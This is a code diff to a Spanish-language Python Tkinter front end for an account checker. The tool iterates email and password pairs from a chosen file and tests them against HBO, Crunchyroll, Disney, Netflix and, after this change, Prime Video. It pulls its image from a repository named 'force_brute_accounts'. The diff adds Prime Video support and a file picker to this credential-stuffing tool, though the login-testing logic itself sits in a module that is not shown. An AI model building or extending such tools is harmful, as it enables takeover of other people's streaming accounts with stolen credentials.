@@ -1,18 +1,44 @@
 import os
+import subprocess
+
+try:
+
+    import ConfigStrem as St
+    from PIL import Image, ImageTk
+
+except Exception as e:
+    print('[-] librerias no instaladas')
+    result = subprocess.run(['pip','install','pillow','selenium','playwright'], stdout = subprocess.PIPE, stderr = subprocess.PIPE)
+
+# https://ftp.mozilla.org/pub/firefox/releases/124.0.2/win64/es-ES/Firefox%20Setup%20124.0.2.exe
+
+import os
 import time
 import socket
 import threading
 import tkinter as tk
+from io import BytesIO
 from tkinter import ttk
 import ConfigStrem as St
+from tkinter import filedialog
 from PIL import Image, ImageTk
+from urllib.request import urlopen
 
-def BuscarTxt(directorio):
-    archivos_txt = []
-    for archivo in os.listdir(directorio):
-        if archivo.endswith(".txt"):
-           archivos_txt.append(archivo)
-    return archivos_txt
+def start():
+    pass
+
+def salir():
+    root.destroy()
+    pass
+
+def BuscarTxt():
+    namefile = filedialog.askopenfilenames()
+    name = namefile[0].split('/')[-1]
+    archivo.config(values = "".join(name))    
+    archivo.current(0) 
+
+    global directory_file
+    directory_file = namefile
 
 def BuscarIp():
     try:
@@ -60,7 +86,7 @@ def Streming(file,streming):
     try:
         is_running = True
 
-        CadenaUsuarios = St.GenCorreo(os.path.join(os.getcwd(),'txt',file),True)
+        CadenaUsuarios = St.GenCorreo(file,True)
 
         while is_running:
             Co, Cs = next(CadenaUsuarios)
@@ -81,6 +107,10 @@ def Streming(file,streming):
                 msg = St.Netflix(Co, Cs)
                 Reflejo(msg)
 
+            if streming == 'Prime Video':
+                msg = St.prime(Co, Cs)
+                Reflejo(msg)
+
             # if streming == 'NKookies':
             #     msg = St.Main(Co,Cs)
 
@@ -94,7 +124,7 @@ def HabilitarRegistro():
 def start_log_thread():
     is_running = False
     if not is_running:
-        log_thread = threading.Thread(target=Streming(archivo.get(),plataforma.get()))
+        log_thread = threading.Thread(target=Streming(directory_file[0],plataforma.get()))
         log_thread.start()
 
 def run():
@@ -107,13 +137,23 @@ root.geometry("415x500")
 root.resizable(False, False)
 root.configure(bg="lightblue")
 
-img = ImageTk.PhotoImage(Image.open(r"imagen.png"))  
+URL = "https://raw.githubusercontent.com/Moubotred/force_brute_accounts/main/Make/imagen.png"
+u = urlopen(URL)
+raw_data = u.read()
+u.close()
+
+img = ImageTk.PhotoImage(data=raw_data) 
 label_img = tk.Label(image=img)
 label_img.place(x=20, y=20)
 
-files = BuscarTxt(os.path.join(os.getcwd(),'txt'))
-archivo = ttk.Combobox(root,height=100,width = 30,justify='center' )
-archivo["values"] = tuple(files)
+Buscarfile = tk.Button(root,text='🔎',command=BuscarTxt)
+Buscarfile.place(x=380, y=110)
+
+archivo = ttk.Combobox(root,height=100,width = 24,justify='center',state='disabled')
+archivo["values"] = tuple('_')
+
+Btnsalir = tk.Button(root,text='salir',width=6,command = salir)
+Btnsalir.place(x=300, y=160)
 
 try:
     archivo.current(0) 
@@ -124,12 +164,11 @@ except Exception:
     Cuando hay archivos aparesera la
     configuracion cerra la app iniciar 
     de nuevo '''
-    
     Advertencia = tk.Label(text=MSG)
-    Advertencia.place(x=205, y=100)
+    Advertencia.place(x=205, y=130)
     
-plataforma = ttk.Combobox(root,height=100,width = 30,justify='center' )
-plataforma["values"] = ("Hbo","NKookies","Crunchyroll", "Disney",'Netflix') 
+plataforma = ttk.Combobox(root,height=100,width = 30,justify='center')
+plataforma["values"] = ("Hbo","NKookies","Crunchyroll", "Disney",'Netflix','Prime Video') 
 plataforma.current(0) 
 plataforma.place(x=200, y=30)
 
@@ -139,8 +178,8 @@ bots["values"] = ips
 bots.current(0) 
 bots.place(x=202, y=70)
 
-BtnRegistro = tk.Button(root, text="iniciar", command=run)
-BtnRegistro.place(x=280, y=160)
+BtnRegistro = tk.Button(root, text="iniciar", width=6, command=run)
+BtnRegistro.place(x=240, y=160)
 
 RegistroText = tk.Text(root,height=15, width=45)
 RegistroText.place(x=25, y=230)
